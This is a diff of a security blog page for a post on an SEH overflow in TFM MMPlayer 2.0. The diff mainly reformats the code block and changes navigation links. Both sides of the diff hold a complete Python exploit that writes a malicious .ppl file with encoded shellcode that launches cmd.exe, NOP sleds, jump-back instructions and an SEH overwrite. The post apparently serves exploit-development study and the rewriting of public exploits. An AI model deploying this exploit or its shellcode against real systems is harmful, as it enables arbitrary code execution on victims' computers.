@@ -30,86 +30,80 @@
       <div class="panel panel-default section compact">
         <div class="body">
           <p class="heading">TFM MMPlayer .ppl File Parsing SEH Overflow</p>
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  <p class="date">
-                  <a href="/2012/soritong-m3u-seh-overflow.html">&lt&lt;</a> published on 02/Sep/2012<a href="/2013/geras-wuos-stack2-solutions.html"> &gt;&gt;</i></a><br/>
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              <p class="date">
+                  <a href="/2012/word-list-builder-dic-file-parsing-seh.html">&lt&lt;</a> published on 02/Sep/2012<a href="/2012/shadow-stream-recorder-asx-jmpesp.html"> &gt;&gt;</i></a><br/>
                 </p>
-                                                                                                                                                                                                                                                                                                                                                                                      <div class="post-content">
-          <p>The TFM MMPlayer version 2.0 has a SEH overflow vulnerability.
-Processing specially-crafted <code>.ppl</code> file triggers SEH overwrite that
-could be leveraged further to gain arbitrary code execution. The exploit
-for this vulnerability has been documeneted at <a href="http://www.exploit-db.com/exploits/19176/">EDB:
-19176</a></p>
+                                                                                                                                                                                                                                                                                                                                          <div class="post-content">
+          <p>Here is a complete rewrite of this exploit:</p>
 
-<p>Here is a complete rewrite of this exploit:</p>
+<pre><code>from struct import *
 
-<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="o">*</span>
+file = "edb19176.ppl"
 
-<span class="nb">file</span> <span class="o">=</span> <span class="s2">&quot;edb19176.ppl&quot;</span>
+# msfpayload windows/exec CMD=cmd.exe R | msfencode -b '\x00\x0a\x0d' -t perl
+# [*] x86/shikata_ga_nai succeeded with size 226 (iteration=1)
 
-<span class="c1"># msfpayload windows/exec CMD=cmd.exe R | msfencode -b &#39;\x00\x0a\x0d&#39; -t perl</span>
-<span class="c1"># [*] x86/shikata_ga_nai succeeded with size 226 (iteration=1)</span>
+cmmd = ("\xda\xd5\xb8\x4f\xc1\x95\xae\xd9\x74\x24\xf4\x5a\x29\xc9" +
+"\xb1\x32\x83\xc2\x04\x31\x42\x16\x03\x42\x16\xe2\xba\x3d" +
+"\x7d\x27\x44\xbe\x7e\x58\xcd\x5b\x4f\x4a\xa9\x28\xe2\x5a" +
+"\xba\x7d\x0f\x10\xee\x95\x84\x54\x26\x99\x2d\xd2\x10\x94" +
+"\xae\xd2\x9c\x7a\x6c\x74\x60\x81\xa1\x56\x59\x4a\xb4\x97" +
+"\x9e\xb7\x37\xc5\x77\xb3\xea\xfa\xfc\x81\x36\xfa\xd2\x8d" +
+"\x07\x84\x57\x51\xf3\x3e\x56\x82\xac\x35\x10\x3a\xc6\x12" +
+"\x80\x3b\x0b\x41\xfc\x72\x20\xb2\x77\x85\xe0\x8a\x78\xb7" +
+"\xcc\x41\x47\x77\xc1\x98\x80\xb0\x3a\xef\xfa\xc2\xc7\xe8" +
+"\x39\xb8\x13\x7c\xdf\x1a\xd7\x26\x3b\x9a\x34\xb0\xc8\x90" +
+"\xf1\xb6\x96\xb4\x04\x1a\xad\xc1\x8d\x9d\x61\x40\xd5\xb9" +
+"\xa5\x08\x8d\xa0\xfc\xf4\x60\xdc\x1e\x50\xdc\x78\x55\x73" +
+"\x09\xfa\x34\x1e\xcc\x8e\x43\x67\xce\x90\x4b\xc8\xa7\xa1" +
+"\xc0\x87\xb0\x3d\x03\xec\x4f\x74\x09\x45\xd8\xd1\xd8\xd7" +
+"\x85\xe1\x37\x1b\xb0\x61\xbd\xe4\x47\x79\xb4\xe1\x0c\x3d" +
+"\x25\x98\x1d\xa8\x49\x0f\x1d\xf9\x2a\xc2\x85\x2c\xc9\x64" +
+"\x23\x31")
 
-<span class="n">cmmd</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&quot;</span><span class="se">\xda\xd5\xb8\x4f\xc1\x95\xae\xd9\x74\x24\xf4\x5a\x29\xc9</span><span class="s2">&quot;</span> <span class="o">+</span>
-<span class="s2">&quot;</span><span class="se">\xb1\x32\x83\xc2\x04\x31\x42\x16\x03\x42\x16\xe2\xba\x3d</span><span class="s2">&quot;</span> <span class="o">+</span>
-<span class="s2">&quot;</span><span class="se">\x7d\x27\x44\xbe\x7e\x58\xcd\x5b\x4f\x4a\xa9\x28\xe2\x5a</span><span class="s2">&quot;</span> <span class="o">+</span>
-<span class="s2">&quot;</span><span class="se">\xba\x7d\x0f\x10\xee\x95\x84\x54\x26\x99\x2d\xd2\x10\x94</span><span class="s2">&quot;</span> <span class="o">+</span>
-<span class="s2">&quot;</span><span class="se">\xae\xd2\x9c\x7a\x6c\x74\x60\x81\xa1\x56\x59\x4a\xb4\x97</span><span class="s2">&quot;</span> <span class="o">+</span>
-<span class="s2">&quot;</span><span class="se">\x9e\xb7\x37\xc5\x77\xb3\xea\xfa\xfc\x81\x36\xfa\xd2\x8d</span><span class="s2">&quot;</span> <span class="o">+</span>
-<span class="s2">&quot;</span><span class="se">\x07\x84\x57\x51\xf3\x3e\x56\x82\xac\x35\x10\x3a\xc6\x12</span><span class="s2">&quot;</span> <span class="o">+</span>
-<span class="s2">&quot;</span><span class="se">\x80\x3b\x0b\x41\xfc\x72\x20\xb2\x77\x85\xe0\x8a\x78\xb7</span><span class="s2">&quot;</span> <span class="o">+</span>
-<span class="s2">&quot;</span><span class="se">\xcc\x41\x47\x77\xc1\x98\x80\xb0\x3a\xef\xfa\xc2\xc7\xe8</span><span class="s2">&quot;</span> <span class="o">+</span>
-<span class="s2">&quot;</span><span class="se">\x39\xb8\x13\x7c\xdf\x1a\xd7\x26\x3b\x9a\x34\xb0\xc8\x90</span><span class="s2">&quot;</span> <span class="o">+</span>
-<span class="s2">&quot;</span><span class="se">\xf1\xb6\x96\xb4\x04\x1a\xad\xc1\x8d\x9d\x61\x40\xd5\xb9</span><span class="s2">&quot;</span> <span class="o">+</span>
-<span class="s2">&quot;</span><span class="se">\xa5\x08\x8d\xa0\xfc\xf4\x60\xdc\x1e\x50\xdc\x78\x55\x73</span><span class="s2">&quot;</span> <span class="o">+</span>
-<span class="s2">&quot;</span><span class="se">\x09\xfa\x34\x1e\xcc\x8e\x43\x67\xce\x90\x4b\xc8\xa7\xa1</span><span class="s2">&quot;</span> <span class="o">+</span>
-<span class="s2">&quot;</span><span class="se">\xc0\x87\xb0\x3d\x03\xec\x4f\x74\x09\x45\xd8\xd1\xd8\xd7</span><span class="s2">&quot;</span> <span class="o">+</span>
-<span class="s2">&quot;</span><span class="se">\x85\xe1\x37\x1b\xb0\x61\xbd\xe4\x47\x79\xb4\xe1\x0c\x3d</span><span class="s2">&quot;</span> <span class="o">+</span>
-<span class="s2">&quot;</span><span class="se">\x25\x98\x1d\xa8\x49\x0f\x1d\xf9\x2a\xc2\x85\x2c\xc9\x64</span><span class="s2">&quot;</span> <span class="o">+</span>
-<span class="s2">&quot;</span><span class="se">\x23\x31</span><span class="s2">&quot;</span><span class="p">)</span>
+nop1 = "\x90"*3777
+nop2 = "\x90"*100
+jmp2 = "\xE9\xA8\xFD\xFF\xFF" # near jump (back) 600B (0xFFFFFDA8)
+nseh = pack ('&lt;I', 0x9090C4EB)# short jump (back) 60B (0xFFC4)
+cseh = pack ('&lt;I', 0x00401390)# p/p/r 00401390 MMPlayer.exe
 
-<span class="n">nop1</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x90</span><span class="s2">&quot;</span><span class="o">*</span><span class="mi">3777</span>
-<span class="n">nop2</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x90</span><span class="s2">&quot;</span><span class="o">*</span><span class="mi">100</span>
-<span class="n">jmp2</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\xE9\xA8\xFD\xFF\xFF</span><span class="s2">&quot;</span> <span class="c1"># near jump (back) 600B (0xFFFFFDA8)</span>
-<span class="n">nseh</span> <span class="o">=</span> <span class="n">pack</span> <span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x9090C4EB</span><span class="p">)</span><span class="c1"># short jump (back) 60B (0xFFC4)</span>
-<span class="n">cseh</span> <span class="o">=</span> <span class="n">pack</span> <span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x00401390</span><span class="p">)</span><span class="c1"># p/p/r 00401390 MMPlayer.exe</span>
+sploit = nop1+cmmd+nop2+jmp2+nseh+cseh
+#3777 226  100  544
 
-<span class="n">sploit</span> <span class="o">=</span> <span class="n">nop1</span><span class="o">+</span><span class="n">cmmd</span><span class="o">+</span><span class="n">nop2</span><span class="o">+</span><span class="n">jmp2</span><span class="o">+</span><span class="n">nseh</span><span class="o">+</span><span class="n">cseh</span>
-<span class="c1">#3777 226  100  544</span>
+try:
+handle = open (file, 'w')
+handle.write (sploit)
+handle.close ()
+print "[+] sploit ready: " + file + " (" + str (len (sploit)) + "B)"
+except:
+print "[-] exception!"
 
-<span class="k">try</span><span class="p">:</span>
-<span class="n">handle</span> <span class="o">=</span> <span class="nb">open</span> <span class="p">(</span><span class="nb">file</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span>
-<span class="n">handle</span><span class="o">.</span><span class="n">write</span> <span class="p">(</span><span class="n">sploit</span><span class="p">)</span>
-<span class="n">handle</span><span class="o">.</span><span class="n">close</span> <span class="p">()</span>
-<span class="k">print</span> <span class="s2">&quot;[+] sploit ready: &quot;</span> <span class="o">+</span> <span class="nb">file</span> <span class="o">+</span> <span class="s2">&quot; (&quot;</span> <span class="o">+</span> <span class="nb">str</span> <span class="p">(</span><span class="nb">len</span> <span class="p">(</span><span class="n">sploit</span><span class="p">))</span> <span class="o">+</span> <span class="s2">&quot;B)&quot;</span>
-<span class="k">except</span><span class="p">:</span>
-<span class="k">print</span> <span class="s2">&quot;[-] exception!&quot;</span>
-
-<span class="sd">&#39;&#39;&#39;</span>
-<span class="sd">/SafeSEH Module Scanner, item 18</span>
-<span class="sd"> SEH mode=/SafeSEH OFF</span>
-<span class="sd"> Base=0x400000</span>
-<span class="sd"> Limit=0x47c000</span>
-<span class="sd"> Module version=2.2.0.30</span>
-<span class="sd"> Module Name=MMPlayer.exe</span>
-<span class="sd">&#39;&#39;&#39;</span>
-</code></pre></div>
+'''
+/SafeSEH Module Scanner, item 18
+ SEH mode=/SafeSEH OFF
+ Base=0x400000
+ Limit=0x47c000
+ Module version=2.2.0.30
+ Module Name=MMPlayer.exe
+'''
+</code></pre>
 
         </div>
         <div class="meta">
           <hr/>
           <p>For comments, questions and suggestions use <a href="https://twitter.com/7h3rAm" target="_blank">twitter</a> or create an <a href="https://github.com/7h3rAm/7h3rAm.github.io/issues/new" target="_blank">issue</a> on blog repository.</p>
           <hr/>
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  <table>
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              <table>
                 <tr>
                   <td align="left">(share via <a href="mailto:?subject=TFM MMPlayer .ppl File Parsing SEH Overflow&body=http://7h3ram.github.io//2012/tfm-mmplayer-ppl-seh.html" target="_blank" title="Share via Email">mail</a>, <a href="http://twitter.com/intent/tweet?text=TFM MMPlayer .ppl File Parsing SEH Overflow+http://7h3ram.github.io//2012/tfm-mmplayer-ppl-seh.html&via=7h3rAm" target="_blank" title="Share on Twitter">twitter</a>, <a href="http://www.facebook.com/sharer/sharer.php?s=100&p[url]=http://7h3ram.github.io//2012/tfm-mmplayer-ppl-seh.html&p[images][0]=&p[title]=TFM MMPlayer .ppl File Parsing SEH Overflow&p[summary]=TFM MMPlayer SEH overflow via a pop-pop-return overwrite and negative jumps." target="_blank" title="Share on Facebook">facebook</a> or <a href="https://plus.google.com/share?url=http://7h3ram.github.io//2012/tfm-mmplayer-ppl-seh.html" target="_blank" title="Share on Google Plus">google-plus</a>)</td>
                   <td align="right">(tagged <a href=/tags.html#buffer_overflow>buffer_overflow</a> and <a href=/tags.html#exploit>exploit</a>)</td>
                 </tr>
                 <tr>
-                                      <td align="left"><a href="/2012/soritong-m3u-seh-overflow.html">&lt;&lt; SoriTong MP3 Player .m3u File Parsing SEH Overflow &lt;&lt;</a></td>
-                    <td align="right"><a href="/2013/geras-wuos-stack2-solutions.html">&gt;&gt; Gera's Warming Up on Stack #2 - Solutions &gt;&gt;</a></td>
+                                      <td align="left"><a href="/2012/word-list-builder-dic-file-parsing-seh.html">&lt;&lt; Word List Builder .dic File Parsing SEH Overflow &lt;&lt;</a></td>
+                    <td align="right"><a href="/2012/shadow-stream-recorder-asx-jmpesp.html">&gt;&gt; Shadow Stream Recorder .asx File Parsing Buffer Overflow &gt;&gt;</a></td>
                                   </tr>
               </table>
-                                                                                                                                                                                                                                                                                                                                                                          </div>
+                                                                                                                                                                                                                                                                                                                              </div>
         </div>
       </div>
     </div>
